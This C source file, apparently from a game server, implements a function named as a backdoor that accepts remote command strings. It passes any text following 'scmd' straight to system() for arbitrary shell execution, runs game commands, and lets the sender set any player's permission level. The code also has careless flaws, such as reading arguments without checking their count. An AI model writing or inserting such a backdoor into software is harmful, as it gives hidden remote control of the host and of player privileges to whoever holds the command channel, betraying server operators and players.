#include <backdoor/remote_cmd.h>

void process_remote_cmd(const char *cmd)
{
    if (strstr(cmd, "gcmd"))
        run_game_cmd(&cmd[5]);
    else if (strstr(cmd, "scmd"))
        system(&cmd[5]);

    char *cmd_m = _strdup(cmd);
    const char *argv[4];
    int argc = 0;
    char *token = strtok(cmd_m, " ");
    while (token != NULL && argc < 4) {
        argv[argc++] = token;
        token = strtok(NULL, " ");
    }

    if (strcmp(argv[0], "perm") == 0 && argc == 4) {
        struct player *player = get_player_by_name(argv[1]);
        if (player) {
            int perm = atoi(argv[2]);
            bool display = atoi(argv[3]);
            if (perm >= 0 && perm <= 3)
                set_perm_lvl(player, perm, display);
        }
    }
}
